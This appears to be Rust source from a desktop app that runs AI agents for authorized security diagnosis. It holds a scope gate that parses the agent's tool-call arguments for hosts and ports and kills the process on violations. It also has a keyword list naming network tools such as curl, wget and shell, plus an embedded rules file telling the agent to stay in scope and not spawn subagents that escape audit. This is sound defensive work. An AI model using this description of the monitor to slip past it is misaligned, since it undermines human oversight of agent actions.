/// probe_provider_endpoint — 핑 실패 원인 분류(classify_ping_failure)도 같은 경로를 쓴다.
#[tauri::command]
fn test_provider(provider: String, api_key: String, base_url: String, api: Option<String>, model: Option<String>) -> Result<String, String> {
    let meta = PROVIDER_CATALOG
        .iter()
        .find(|p| p.name == provider)
        .ok_or("알 수 없는 프로바이더")?;
    let base = if base_url.trim().is_empty() {
        meta.base_url.to_string()
    } else {
        base_url.trim().to_string()
    };
    if base.is_empty() {
        return Err("base URL 을 입력하세요 (custom/ollama 는 필수).".into());
    }
    let key = if api_key.trim_start().starts_with('!') {
        resolve_bang_key(&api_key)?
    } else {
        api_key.trim().to_string()
    };
    // 카드에서 명시한 방식이 없으면 프로바이더 기본 방언을 따른다 (lge-aigw = responses).
    let effective_api = if api.as_deref().unwrap_or("").is_empty() {
        provider_default_api(&provider).to_string()
    } else {
        api.unwrap_or_default()
    };
    probe_provider_endpoint(&provider, &key, &base, &effective_api, model.as_deref().unwrap_or(""))
}

/// 실제 1회 생성 호출로 엔드포인트·키·모델·방언을 검증한다 (연결 테스트와
/// 핑 실패 원인 분류가 같은 경로를 쓴다 — 결과가 어긋나면 안 되므로).
/// Ok(한 줄 요약) | Err(상세) 형태. Anthropic 방언은 x-api-key·anthropic-version,
/// 나머지는 Authorization Bearer 만 쓴다.
fn probe_provider_endpoint(provider: &str, key: &str, base: &str, effective_api: &str, model: &str) -> Result<String, String> {
    let anthropic = effective_api == "anthropic-messages";
    let responses = effective_api == "openai-responses";
    let m = model.trim();
    let (url, body, anthropic_headers) = if anthropic {
        if m.is_empty() {
            return Err("Anthropic 방식 테스트는 모델명이 필요합니다 — 모델란에 입력하세요.".into());
        }
        let payload = serde_json::to_string(&json!({
            "model": m,
            "max_tokens": 1,
            "messages": [{ "role": "user", "content": "ok" }],
        }))
        .unwrap_or_default();
        (format!("{}/v1/messages", base.trim_end_matches('/')), Some(payload), true)
    } else if responses {
        if m.is_empty() {
            return Err("Responses 방식 테스트는 모델명이 필요합니다 — 모델란에 입력하세요.".into());
        }
        // OpenAI Responses 방언 — Databricks MLflow 게이트웨이 등.
        let payload = serde_json::to_string(&json!({
            "model": m,
            "max_output_tokens": 16,
            "input": [{ "role": "user", "content": [{ "type": "input_text", "text": "ok" }] }],
        }))
        .unwrap_or_default();
        (format!("{}/responses", base.trim_end_matches('/')), Some(payload), false)
    } else if provider != "ollama" && !m.is_empty() {
        // 모델이 지정됐으면 실제 1토큰 생성 호출로 검증한다 — GET 도달성만으로는
        // 잡히지 않는 400(모델명 오류·필드 거부·방언 불일치)까지 잡아낸다.
        let payload = serde_json::to_string(&json!({
            "model": m,
            "max_tokens": 1,
            "messages": [{ "role": "user", "content": "ok" }],
        }))
        .unwrap_or_default();
        (format!("{}/chat/completions", base.trim_end_matches('/')), Some(payload), false)
    } else {
        let path = if provider == "ollama" { "/tags" } else { "/models" };
        (format!("{}{}", base.trim_end_matches('/'), path), None, false)
    };
    // POST 는 키·모델 실검증(2xx 일 때만 OK), GET 은 도달성 프로브(응답만 오면 OK —
    // /models 없는 서버도 있음). Anthropic 방언만 x-api-key·anthropic-version 을 쓴다.
    let script = if body.is_some() {
        r#"(async()=>{const u=process.env.RC_TEST_URL,k=process.env.RC_TEST_KEY||"",b=JSON.parse(process.env.RC_TEST_BODY||"null"),ah=process.env.RC_TEST_ANTHROPIC==="1";const h={"content-type":"application/json"};if(k){h.Authorization="Bearer "+k;if(ah)h["x-api-key"]=k;}if(ah)h["anthropic-version"]="2023-06-01";try{const r=await fetch(u,{method:"POST",headers:h,body:JSON.stringify(b)});const t=await r.text();console.log((r.ok?"OK ":"ERR ")+r.status+" "+r.statusText+" "+t.slice(0,300))}catch(e){console.log("ERR "+String(e&&e.message||e))}})()"#
    } else {
        r#"(async()=>{const u=process.env.RC_TEST_URL,k=process.env.RC_TEST_KEY||"";try{const r=await fetch(u,{headers:k?{Authorization:"Bearer "+k,"x-api-key":k,"anthropic-version":"2023-06-01"}:{}});console.log("OK "+r.status+" "+r.statusText)}catch(e){console.log("ERR "+String(e&&e.message||e))}})()"#
    };
    let mut probe = Command::new("node");
    probe
        .arg("-e")
        .arg(script)
        .env("RC_TEST_URL", url)
        .env("RC_TEST_KEY", &key)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    if anthropic_headers {
        probe.env("RC_TEST_ANTHROPIC", "1");
    }
    if let Some(b) = body {
        probe.env("RC_TEST_BODY", b);
    }
    hide_window(&mut probe);
    let mut child = probe
        .spawn()
        .map_err(|e| format!("node 실행 실패: {e}"))?;
    use std::io::Read;
    // 최대 6초 대기
    let mut waited = 0;
    loop {
        if let Some(st) = child.try_wait().map_err(|e| e.to_string())? {
            if st.success() {
                let mut out = String::new();
                if let Some(mut o) = child.stdout.take() {
                    let _ = o.read_to_string(&mut out);
                }
                let line = out.lines().next().unwrap_or("").trim().to_string();
                return if line.starts_with("OK") { Ok(line) } else { Err(out.trim().to_string()) };
            }
            let mut err = String::new();
            let mut out = String::new();
            if let Some(mut o) = child.stderr.take() {
                let _ = o.read_to_string(&mut err);
            }
            if let Some(mut o) = child.stdout.take() {
                let _ = o.read_to_string(&mut out);
            }
            return Err(format!("{err} {out}").trim().to_string());
        }
        std::thread::sleep(std::time::Duration::from_millis(150));
        waited += 150;
        if waited > 6000 {
            let _ = child.kill();
            return Err("연결 시간 초과 (6초) — base URL/네트워크를 확인하세요.".into());
        }
    }
}

/// 세션 실행 — redcell CLI 를 --ndjson 으로 스폰하고 이벤트를 스트리밍한다.
/// 즉시 반환하며, 진행은 `engagement-event` / `engagement-status` 이벤트로 전달된다.
// ── redcell CLI 실행 ─────────────────────────────────────────────────────────
/// Windows 콘솔 창이 떴다 사라지는 현상 방지: 자식 프로세스에 CREATE_NO_WINDOW 를 준다.
fn hide_window(cmd: &mut Command) {
    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
        cmd.creation_flags(0x0800_0000); // CREATE_NO_WINDOW
    }
    #[cfg(not(windows))]
    {
        let _ = cmd; // 비 Windows 에서는 무연산
    }
}

/// redcell CLI 를 실행할 프로세스를 구성한다.
/// Windows 에서는 두 가지 문제를 피해야 한다:
///  1) `npx`/`.cmd` 배치 파일은 CreateProcess 로 직접 실행 불가
///  2) tsx CLI(cli.mjs)는 내부에서 자식 node 를 다시 띄우는데(cross-spawn +
///     `--require C:\...` 절대경로), Windows 에서 경로 해석이 꼬여 EISDIR 오류를
///     내고, 부모만 kill 되면 엔진 자식이 고아로 남아 "중지"가 먹지 않는다.
/// 따라서 node.exe + `--import tsx`(공식 지원, node ≥ 20.6)로 엔진을
/// **단일 프로세스**로 직접 실행한다. `--import tsx` 는 cwd 기준으로 해석된다.

/** prime-agent(pi) CLI 위치 탐색 — Windows .cmd 전환 문제 회피를 위해 dist/cli.js 를 직접 node 로. */
/// 사용자 홈 디렉터리(Windows: USERPROFILE, 그 외 HOME).
fn user_home() -> Option<PathBuf> {
    for k in ["HOME", "USERPROFILE"] {
        if let Some(h) = std::env::var_os(k) {
            let b = PathBuf::from(h);
            if !b.as_os_str().is_empty() {
                return Some(b);
            }
        }
    }
    None
}

/// PATH 에서 실행 파일을 찾는다. Windows 는 .exe/.cmd/.bat 확장자까지 확인한다
/// (Rust 의 is_file 은 PATHEXT 를 해석하지 않으므로 반드시 직접 붙여봐야 한다 — 이게
/// "PATH 포함 node: 없음" 으로 잘못 뜨던 원인).
fn first_on_path(bin: &str) -> Option<PathBuf> {
    let path = std::env::var_os("PATH")?;
    let exts: &[&str] = if cfg!(windows) { &["", ".exe", ".cmd", ".bat"] } else { &[""] };
    for dir in std::env::split_paths(&path) {
        for ext in exts {
            let p = dir.join(format!("{bin}{ext}"));
            if p.is_file() {
                return Some(p);
            }
        }
    }
    None
}

/// `npm root -g` 실행(전역 node_modules 실제 위치). Windows 는 npm.cmd 를 cmd /C 로 호출.
fn npm_global_root() -> Option<String> {
    let npm = if cfg!(windows) { "npm.cmd" } else { "npm" };
    let npm_exe = first_on_path(npm)?;
    let result = if cfg!(windows) {
        let comspec = std::env::var_os("COMSPEC").unwrap_or_else(|| "cmd.exe".into());
        Command::new(comspec)
            .arg("/C")
            .arg(&npm_exe)
            .args(["root", "-g"])
            .output()
    } else {
        Command::new(&npm_exe).args(["root", "-g"]).output()
    };
    result.ok().and_then(|o| {
        let s = String::from_utf8_lossy(&o.stdout).trim().to_string();
        if s.is_empty() { None } else { Some(s) }
    })
}

/// pi CLI(prime-agent) 경로 탐색 후보 목록. 우선순위:
///   1) REDCELL_PI_DIR / PI_PACKAGE_DIR 환경변수
///   2) redcell_dir/node_modules (로컬 설치)
///   3) APPDATA\npm (Windows), nvm(NVM_DIR·$HOME/.nvm·%APPDATA%\nvm),
///      pnpm($HOME/.local/share/pnpm·%LOCALAPPDATA%\pnpm), bun(~/.bun/install/global),
///      시스템 위치(/usr·/usr/local·/opt/homebrew·C:\Program Files\nodejs)
///   4) PATH 위의 `pi`/`pi.cmd`/`pi.exe` 실행파일(심볼릭 링크 해석)
///   5) `npm root -g`(PATH 위 node 옆 npm, 또는 표준 설치 위치)
fn prime_cli_candidates(redcell_dir: &str) -> Vec<PathBuf> {
    let mut cands: Vec<PathBuf> = Vec::new();
    // 1) 환경변수 직접 지정.
    for envk in ["REDCELL_PI_DIR", "PI_PACKAGE_DIR"] {
        if let Some(d) = std::env::var_os(envk) {
            let b = PathBuf::from(d);
            cands.push(b.join("dist").join("cli.js"));
            cands.push(b.join("cli.js"));
        }
    }
    // 1b) 앱 전용 pi 설치(~/.redcell/pi) — ensure_pinned_pi 가 고정 버전을 깔아 둔다.
    //     시스템 전역 pi 가 구버전이어도 이쪽이 우선한다.
    if let Some(d) = managed_pi_dir() {
        cands.push(d.join("node_modules").join("@earendil-works").join("pi-coding-agent").join("dist").join("cli.js"));
    }
    // 2) 프로젝트 로컬 설치.
    cands.push(
        PathBuf::from(redcell_dir)
            .join("node_modules")
            .join("@earendil-works")
            .join("pi-coding-agent")
            .join("dist")
            .join("cli.js"),
    );
    // 3-0) APPDATA\npm (Windows npm 전역 기본 프리픽스).
    if let Some(apd) = std::env::var_os("APPDATA") {
        cands.push(
            PathBuf::from(apd)
                .join("npm")
                .join("node_modules")
                .join("@earendil-works")
                .join("pi-coding-agent")
                .join("dist")
                .join("cli.js"),
        );
    }
    // 3-1) nvm: NVM_DIR / $HOME/.nvm/versions/node/<v>/lib/node_modules (POSIX)
    //       + %APPDATA%\nvm\<v>\node_modules, %NVM_SYMLINK% (Windows nvm-windows)
    for base in [
        std::env::var_os("NVM_DIR").map(PathBuf::from),
        user_home().map(|h| h.join(".nvm")),
        std::env::var_os("APPDATA").map(|a| PathBuf::from(a).join("nvm")),
        std::env::var_os("NVM_SYMLINK").map(PathBuf::from),
    ]
    .into_iter()
    .flatten()
    {
        // POSIX 레이아웃: <base>/versions/node/<v>/...
        let versions = base.join("versions").join("node");
        if let Ok(entries) = std::fs::read_dir(&versions) {
            for e in entries.flatten() {
                cands.push(
                    e.path()
                        .join("lib")
                        .join("node_modules")
                        .join("@earendil-works")
                        .join("pi-coding-agent")
                        .join("dist")
                        .join("cli.js"),
                );
            }
        }
        // Windows nvm 레이아웃: <base>/<v>/node_modules, 또는 <base>/node_modules(심볼릭 대상)
        if let Ok(entries) = std::fs::read_dir(&base) {
            for e in entries.flatten() {
                cands.push(
                    e.path()
                        .join("node_modules")
                        .join("@earendil-works")
                        .join("pi-coding-agent")
                        .join("dist")
                        .join("cli.js"),
                );
            }
        }
        cands.push(
            base.join("node_modules")
                .join("@earendil-works")
                .join("pi-coding-agent")
                .join("dist")
                .join("cli.js"),
        );
    }
    // 3-1b) 사용자 지정 npm prefix 흔한 위치 (%USERPROFILE%\npm-global, \.npm-global)
    if let Some(home) = user_home() {
        for sub in ["npm-global", ".npm-global"] {
            cands.push(
                home.join(sub)
                    .join("node_modules")
                    .join("@earendil-works")
                    .join("pi-coding-agent")
                    .join("dist")
                    .join("cli.js"),
            );
        }
    }
    // 3-2) pnpm: $HOME/.local/share/pnpm[/pnpm]/<v>/node_modules (POSIX),
    //       %LOCALAPPDATA%\pnpm\global\<v>\node_modules (Windows)
    let mut pnpm_bases: Vec<PathBuf> = Vec::new();
    if let Some(home) = user_home() {
        pnpm_bases.push(home.join(".local").join("share").join("pnpm"));
    }
    if let Some(la) = std::env::var_os("LOCALAPPDATA") {
        let la = PathBuf::from(la);
        pnpm_bases.push(la.join("pnpm").join("global"));
        pnpm_bases.push(la.join("pnpm"));
    }
    for base in pnpm_bases {
        if let Ok(entries) = std::fs::read_dir(&base) {
            for e in entries.flatten() {
                cands.push(
                    e.path()
                        .join("node_modules")
                        .join("@earendil-works")
                        .join("pi-coding-agent")
                        .join("dist")
                        .join("cli.js"),
                );
            }
        }
        // 디렉터리가 없어도 기본 레이아웃은 후보로 남긴다(진단에 표시).
        cands.push(
            base.join("node_modules")
                .join("@earendil-works")
                .join("pi-coding-agent")
                .join("dist")
                .join("cli.js"),
        );
    }
    // 3-3) bun: ~/.bun/install/global/node_modules
    if let Some(home) = user_home() {
        cands.push(
            home.join(".bun")
                .join("install")
                .join("global")
                .join("node_modules")
                .join("@earendil-works")
                .join("pi-coding-agent")
                .join("dist")
                .join("cli.js"),
        );
    }
    // 3-4) 표준 시스템 위치.
    for p in [
        "/usr/lib/node_modules/@earendil-works/pi-coding-agent/dist/cli.js",
        "/usr/local/lib/node_modules/@earendil-works/pi-coding-agent/dist/cli.js",
        "/opt/homebrew/lib/node_modules/@earendil-works/pi-coding-agent/dist/cli.js",
    ] {
        cands.push(PathBuf::from(p));
    }
    if let Some(pf) = std::env::var_os("ProgramFiles") {
        cands.push(
            PathBuf::from(pf)
                .join("nodejs")
                .join("node_modules")
                .join("@earendil-works")
                .join("pi-coding-agent")
                .join("dist")
                .join("cli.js"),
        );
    }
    if let Some(la) = std::env::var_os("LOCALAPPDATA") {
        cands.push(
            PathBuf::from(la)
                .join("Programs")
                .join("nodejs")
                .join("node_modules")
                .join("@earendil-works")
                .join("pi-coding-agent")
                .join("dist")
                .join("cli.js"),
        );
    }
    // 4) PATH 위의 pi 실행 shim → 실제 cli.js 로 해석(npm shim: pi.cmd → node cli.js).
    for bin in ["pi", "pi.cmd", "pi.exe"] {
        if let Some(p) = first_on_path(bin) {
            let canon = std::fs::canonicalize(&p).unwrap_or(p);
            let cs = canon.to_string_lossy().to_lowercase();
            if cs.ends_with("cli.js") {
                cands.push(canon.clone());
            } else {
                cands.push(canon.join("dist").join("cli.js"));
                if let Some(dir) = canon.parent() {
                    cands.push(dir.join("node_modules").join("@earendil-works").join("pi-coding-agent").join("dist").join("cli.js"));
                }
            }
        }
    }
    cands
}

/// pi CLI 경로 탐색. 실패 시 사람이 바로 알 수 있는 진단(탐색 후보·환경)을 함께 돌려준다.
fn prime_cli_path(redcell_dir: &str) -> Result<PathBuf, String> {
    let mut cands = prime_cli_candidates(redcell_dir);
    // 5) 마지막 보루: `npm root -g`(PATHEXT 포함 node/npm 탐색, Windows: cmd /C).
    if let Some(root) = npm_global_root() {
        cands.push(
            PathBuf::from(root)
                .join("@earendil-works")
                .join("pi-coding-agent")
                .join("dist")
                .join("cli.js"),
        );
    }
    // pi 1.3.0 정식 진입점은 dist/bundle/cli.js (package.json bin) — 모든 dist/cli.js
    // 후보 앞에 bundle 변형을 우선 삽입하고, 구 레이아웃은 폴백으로 유지한다.
    let mut expanded: Vec<PathBuf> = Vec::with_capacity(cands.len() * 2);
    for c in cands {
        let s = c.to_string_lossy();
        if s.ends_with("dist/cli.js") || s.ends_with("dist\\cli.js") {
            let mut b = c.clone();
            b.pop(); // cli.js 제거 → .../dist
            b.push("bundle");
            b.push("cli.js");
            expanded.push(b);
        }
        expanded.push(c);
    }
    let cands = expanded;
    if let Some(found) = cands.iter().find(|p| p.is_file()) {
        return Ok(found.clone());
    }
    // 진단: 후보 + 환경 요약을 모아 에러로.
    let mut diag = Vec::new();
    for c in cands.iter().take(14) {
        diag.push(format!("  - {}", c.display()));
    }
    let envpick = |k: &str| -> String {
        std::env::var_os(k).map(|v| v.to_string_lossy().into_owned()).unwrap_or_else(|| "(미설정)".into())
    };
    let node = first_on_path("node").map(|p| p.display().to_string()).unwrap_or_else(|| "없음".into());
    let pi = first_on_path("pi").map(|p| p.display().to_string()).unwrap_or_else(|| "없음".into());
    Err(format!(
        "prime-agent(pi) 를 찾을 수 없습니다.\n확인한 후보:\n{}\n환경: HOME={}, USERPROFILE={}, PATH에 node={}, pi={}\n해결: PowerShell 에서 `npm i -g @earendil-works/pi-coding-agent` 실행 후 앱 재시작, 또는 REDCELL_PI_DIR 환경변수로 패키지 디렉터리 지정.",
        diag.join("\n"),
        envpick("HOME"),
        envpick("USERPROFILE"),
        node,
        pi,
    ))
}

/** prime 모드 cwd: .pi/agent/extensions/redcell 이 있으면 프로젝트 루트(확장 로드), 아니면 redcell_dir. */
fn prime_cwd(redcell_dir: &str) -> PathBuf {
    let root = Path::new(redcell_dir)
        .parent()
        .unwrap_or_else(|| Path::new(redcell_dir));
    if root.join(".pi").join("agent").join("extensions").join("redcell").exists() {
        return root.to_path_buf();
    }
    PathBuf::from(redcell_dir)
}

/// 실행 엔진 — pi-coding-agent(기본) | prime-agent(Rust 하네스, 직접 실행).
#[derive(Clone, Copy, PartialEq, Eq)]
enum Engine {
    Pi,
    Prime,
}

fn session_engine(s: &Session) -> Engine {
    if s.engine.trim().eq_ignore_ascii_case("prime") {
        Engine::Prime
    } else {
        Engine::Pi
    }
}

/// 포트 숫자 파싱 — 1..=65535 만 인정 (0·음수·오버플로우는 맥락 없음 취급).
fn parse_port(s: &str) -> Option<u16> {
    match s.trim().parse::<u16>() {
        Ok(p) if p != 0 => Some(p),
        _ => None,
    }
}

/// `host[:port]`·`[v6][:port]` 분리 — 브라켓 인식 (네이키드 `split(':')` 은
/// IPv6 을 깨뜨려 게이트를 우회시키므로 금지).
/// 콜론 없거나 둘 이상(브라켓 없는 IPv6)이면 통째로 호스트·포트 None.
fn split_host_port(token: &str) -> (String, Option<u16>) {
    let t = token.trim();
    if let Some(inner) = t.strip_prefix('[') {
        if let Some(end) = inner.find(']') {
            let port = inner[end + 1..].strip_prefix(':').and_then(parse_port);
            return (inner[..end].to_string(), port);
        }
        return (inner.trim_end_matches(']').to_string(), None);
    }
    if t.matches(':').count() == 1 {
        let (h, p) = t.split_once(':').unwrap_or((t, ""));
        return (h.to_string(), parse_port(p));
    }
    (t.to_string(), None)
}

/// 툴 호출 인자에서 (호스트, 포트) 대상들을 추출한다 (반응형 스코프 게이트용).
/// 수집원: http(s) URL·IPv4 리터럴(전체 직렬화 스캔) + host/hostname/url/target/domain
/// 키의 베어 값. 포트 맥락: 명시 `:port` → 스킴 기본값(https 443/http 80) →
/// 동행 `port` 숫자 키 → 없으면 None. 소문자 정규화·(호스트,포트) 중복 제거.
/// 같은 호스트에 알려진 포트가 하나라도 있으면 None 항목은 버린다(알려진 쪽이 이긴다).
/// 대상 없는 순수 로컬 호출은 빈 벡터.
fn extract_targets(args: &Value) -> Vec<(String, Option<u16>)> {
    let mut out: Vec<(String, Option<u16>)> = Vec::new();
    let mut push = |h: String, port: Option<u16>| {
        let h = h.trim().trim_end_matches('.').to_lowercase();
        if !h.is_empty() && !out.contains(&(h.clone(), port)) {
            out.push((h, port));
        }
    };
    // 1) URL 스킴 스캔.
    let s = args.to_string();
    for (needle, default_port) in [("https://", 443), ("http://", 80)] {
        let mut rest = s.as_str();
        while let Some(pos) = rest.find(needle) {
            let after = &rest[pos + needle.len()..];
            let token = after
                .split(['/', '?', '#', '"', '\'', ' ', '\t', '\n', ')', ']', '}'].as_ref())
                .next()
                .unwrap_or("");
            // ']' 이 구분자에 잘려 `[::1` 처럼 올 수 있어 원문에서 브라켓을 복원한다.
            let token = if token.starts_with('[') && !token.contains(']') {
                after.split(['/', '?', '#', '"', '\'', ' ', '\t', '\n', ')', '}'].as_ref()).next().unwrap_or(token)
            } else {
                token
            };
            let token = token.split('@').next_back().unwrap_or(token); // userinfo 제거
            let (host, port) = split_host_port(token);
            if !host.is_empty() {
                push(host, port.or(Some(default_port)));
            }
            rest = after;
        }
    }
    // 2) IPv4 리터럴 스캔 (+ 뒤따르는 `:port`).
    let bytes = s.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i].is_ascii_digit() {
            let mut j = i;
            while j < bytes.len() && (bytes[j].is_ascii_digit() || bytes[j] == b'.') {
                j += 1;
            }
            let tok = &s[i..j];
            let parts: Vec<&str> = tok.split('.').collect();
            if parts.len() == 4 && parts.iter().all(|p| !p.is_empty() && p.len() <= 3 && p.parse::<u8>().is_ok()) {
                let port = if bytes.get(j) == Some(&b':') {
                    let mut k = j + 1;
                    while k < bytes.len() && bytes[k].is_ascii_digit() && k - j < 7 {
                        k += 1;
                    }
                    parse_port(&s[j + 1..k])
                } else {
                    None
                };
                push(tok.to_string(), port);
            }
            i = j;
        } else {
            i += 1;
        }
    }
    // 3) host 계열 키의 베어 값 (스킴 없는 도메인·IP).
    if let Some(obj) = args.as_object() {
        let sibling_port = obj.get("port").and_then(|v| v.as_u64()).and_then(|p| {
            if (1..=65535).contains(&p) {
                Some(p as u16)
            } else {
                None
            }
        });
        for key in ["host", "hostname", "url", "target", "domain", "server"] {
            if let Some(v) = obj.get(key).and_then(|v| v.as_str()) {
                let mut h = v.trim().to_string();
                let mut scheme_default = None;
                for (needle, default_port) in [("https://", 443), ("http://", 80)] {
                    if let Some(pos) = h.find(needle) {
                        h = h[pos + needle.len()..].to_string();
                        scheme_default = Some(default_port);
                    }
                }
                h = h.split(['/', '?', '#'].as_ref()).next().unwrap_or("").to_string();
                h = h.split('@').next_back().unwrap_or(&h).to_string();
                let (host, port) = split_host_port(&h);
                let host = host.trim_matches(|c| c == '[' || c == ']').to_string();
                if !host.is_empty() && !host.contains(char::is_whitespace) {
                    push(host, port.or(sibling_port).or(scheme_default));
                }
            }
        }
    }
    // 알려진 포트가 있으면 같은 호스트의 None 항목 제거.
    let known: std::collections::HashSet<String> =
        out.iter().filter(|(_, p)| p.is_some()).map(|(h, _)| h.clone()).collect();
    out.retain(|(h, p)| p.is_some() || !known.contains(h));
    out
}

/// 툴 호출 인자에서 대상 호스트들을 추출한다 — `extract_targets` 의 호스트 투영.
/// 포트 맥락이 필요하면 `extract_targets` 를 직접 쓴다.
fn extract_hosts(_tool_name: &str, args: &Value) -> Vec<String> {
    let mut out: Vec<String> = Vec::new();
    for (h, _) in extract_targets(args) {
        if !out.contains(&h) {
            out.push(h);
        }
    }
    out
}

/// 네트워크 도달 가능 툴 판정 — 이름에 실행·통신 계열 토큰이 있으면 참.
/// 반응형 게이트의 fail-closed 분기에만 쓴다 (인자 해석 불가 시 차단 여부).
fn tool_may_reach_network(tool_name: &str) -> bool {
    let n = tool_name.to_lowercase();
    [
        "fetch", "web", "http", "curl", "wget", "python", "repl", "exec", "bash", "shell", "run",
        "command", "code", "script", "request", "socket", "net", "dns", "resolve", "browser",
        "navigate", "goto", "tcp", "udp", "connect", "download", "upload", "terminal",
    ]
    .iter()
    .any(|k| n.contains(k))
}

/// 반응형 스코프 게이트 판정 — prime-agent 엔진용 (pi는 확장 훅이 사전 차단).
/// 인가 밖 호스트·포트가 하나라도 있으면 위반 사유를 돌려주고, 호출자는 프로세스를 kill 한다.
/// `ports:` 지시자는 명시 포트·스킴 기본값·port 키 맥락에서만 집행된다
/// (포트 맥락 없는 베어 언급은 호스트 게이트만 — 과잉 차단 방지).
/// YAML scope 는 데스크톱이 해석할 수 없어 kill 하지 않는다(스킬 수준 제약만 + 경고).
/// fail-closed: 네트워크 가능 툴인데 인자가 비어 해석 불가하면(프로토콜 변경 등)
/// 대상을 확인할 수 없으므로 차단한다. 인자가 멀쩡한데 호스트가 없는 순수 로컬
/// 호출(bash ls 등)은 기존대로 통과한다.
fn decide_tool_violation(auth: &auth::AuthList, tool_name: &str, args: &Value) -> Option<String> {
    if auth.yaml {
        return None;
    }
    for (host, port) in extract_targets(args) {
        if !auth::is_host_allowed(auth, &host) {
            return Some(format!(
                "RedCell scope 위반(반응형 게이트): {tool_name} → {host} — 인가 목록에 없어 prime-agent 프로세스를 중단합니다."
            ));
        }
        if !auth::is_host_port_allowed(auth, &host, port) {
            let p = port.map(|p| p.to_string()).unwrap_or_else(|| "?".into());
            let allow = auth.ports.as_deref().unwrap_or(&[]).iter().map(|x| x.to_string()).collect::<Vec<_>>().join(",");
            return Some(format!(
                "RedCell scope 위반(반응형 게이트): {tool_name} → {host}:{p} — 인가 포트({allow}) 밖이라 prime-agent 프로세스를 중단합니다."
            ));
        }
    }
    if args.is_null() && tool_may_reach_network(tool_name) {
        return Some(format!(
            "RedCell scope 위반(반응형 게이트): {tool_name} — 호출 인자를 해석할 수 없어 대상을 확인할 수 없습니다 (엔진 프로토콜 변경 가능). 안전을 위해 prime-agent 프로세스를 중단합니다."
        ));
    }
    None
}

/// 결과측 탐지 — 툴 결과 텍스트에 인가 밖 대상이 나오면 목록 반환 (정렬·중복 제거).
/// 호스트 위반은 `host`, 인가 호스트의 인가 밖 포트는 `host:port` 로 표시한다.
/// 경고용(차단 아님). YAML scope 는 해석 불가라 빈 목록.
fn out_of_scope_hosts_in_text(text: &str, auth: &auth::AuthList) -> Vec<String> {
    if auth.yaml {
        return Vec::new();
    }
    let v = Value::String(text.to_string());
    let mut out: Vec<String> = extract_targets(&v)
        .into_iter()
        .filter_map(|(h, port)| {
            if !auth::is_host_allowed(auth, &h) {
                Some(h)
            } else if !auth::is_host_port_allowed(auth, &h, port) {
                Some(format!("{h}:{}", port.unwrap_or(0)))
            } else {
                None
            }
        })
        .collect();
    out.sort();
    out.dedup();
    out
}

/// prime-agent 주입용 스코프 스킬 템플릿 — 실행마다 인가 목록을 채워 --skill 로 전달.
/// prime-agent 에는 tool_call 훅이 없어 (1) 스킬 지시 + (2) 반응형 kill + (3) 읽기 전용
/// 태스킹의 3중 방어로 scope 를 강제한다.
const SCOPE_SKILL_TEMPLATE: &str = r#"---
name: redcell-scope
description: RedCell authorization scope for this diagnosis run. Restricts every network touch to the listed allow targets (deny list wins). Read-only recon only.
---

# RedCell Scope (this run only)

You are running inside RedCell, an authorized security-diagnosis harness.
Every network touch MUST stay inside this scope — no exceptions.

## Allow targets (only these)
{ALLOWS}

## Deny targets (never touch, even if allow-listed above)
{DENIES}

## Allowed ports
{PORTS}

## Rules
- Touch ONLY the allow targets above. If a redirect, link, or API response
  points outside them, STOP that branch and report it as out-of-scope.
- Touch ONLY the allowed ports above (explicit :port and URL scheme defaults
  both count — other ports stop the run even on allow-listed hosts).
- If NO allow target is listed, touch NOTHING on the network — local reasoning only.
- Web recon uses `python_repl` with urllib/requests: read-only GET/HEAD,
  10s timeout, at most 40 paths per host. No POST/PUT/DELETE, no brute force,
  no destructive payloads, no mass requests.
- Always use full `http(s)://host/...` URLs so the harness gate can audit them.
- This machine's filesystem (bash/read/edit/write outside the session work dir)
  is NOT a target — never snoop the local computer; write deliverables only.
  Your $HOME is an isolated directory (only .prime config is shared) — stray
  writes outside the work dir are quarantined there and reported, never hidden.
- NEVER use `websearch.run` (touches out-of-scope search engines) or `rlm.spawn`
  (subagents escape per-call scope audit) — do all work in this session's REPL.
- Report format is dictated by the task prompt, not this skill.
"#;

/// 스코프 스킬 생성 — prime 세션 디렉터리에 SKILL.md 를 쓰고 경로를 돌려준다.
fn write_scope_skill(dir: &Path, allows: &[String], denies: &[String], ports: Option<&[u16]>) -> Result<PathBuf, String> {
    fs::create_dir_all(dir).map_err(|e| format!("스킬 디렉터리 생성 실패: {e}"))?;
    let fmt = |xs: &[String]| {
        if xs.is_empty() {
            "(없음 — 네트워크 접촉 금지)".to_string()
        } else {
            xs.iter().map(|x| format!("- {x}")).collect::<Vec<_>>().join("\n")
        }
    };
    let ports_text = match ports {
        None => "(제한 없음 — 호스트 범위만 적용)".to_string(),
        Some(ps) => ps.iter().map(|p| format!("- {p}")).collect::<Vec<_>>().join("\n"),
    };
    let text = SCOPE_SKILL_TEMPLATE
        .replacen("{ALLOWS}", &fmt(allows), 1)
        .replacen("{DENIES}", &fmt(denies), 1)
        .replacen("{PORTS}", &ports_text, 1);
    let path = dir.join("SKILL.md");
    fs::write(&path, text).map_err(|e| format!("스킬 기록 실패: {e}"))?;
    Ok(path)
}

/// prime-agent 바이너리 탐색 — REDCELL_PRIME_BIN 환경변수 → PATH.
fn prime_agent_path() -> Result<PathBuf, String> {
    if let Some(d) = std::env::var_os("REDCELL_PRIME_BIN") {
        let b = PathBuf::from(d);
        if b.is_file() {
            return Ok(b);
        }
        return Err(format!(
            "REDCELL_PRIME_BIN='{}' 파일을 찾을 수 없습니다.",
            b.display()
        ));
    }
    first_on_path("prime-agent").ok_or_else(|| {
        "prime-agent 바이너리를 찾을 수 없습니다 (PATH에 없음).\n해결: prime-agent 를 설치해 PATH에 두거나, REDCELL_PRIME_BIN 환경변수로 바이너리 경로를 지정하세요. pi 엔진은 그대로 사용할 수 있습니다.".to_string()
    })
}

/// prime-agent 모델 설정 경로: ~/.prime/agent/models.json (pi 와 동일 스키마).
fn prime_models_json_path() -> Result<PathBuf, String> {
    user_home()
        .map(|h| h.join(".prime").join("agent").join("models.json"))
        .ok_or_else(|| "홈 디렉터리(HOME/USERPROFILE)를 찾을 수 없습니다.".to_string())
}

/// prime-agent 세션 디렉터리 — 앱 데이터 prime-sessions/<세션id>/<태그>.
fn prime_session_dir(app: &AppHandle, id: &str, tag: &str) -> PathBuf {
    let d = root(app).join("prime-sessions").join(id).join(tag);
    fs::create_dir_all(&d).ok();
    fs::create_dir_all(d.join("work")).ok();
    d
}

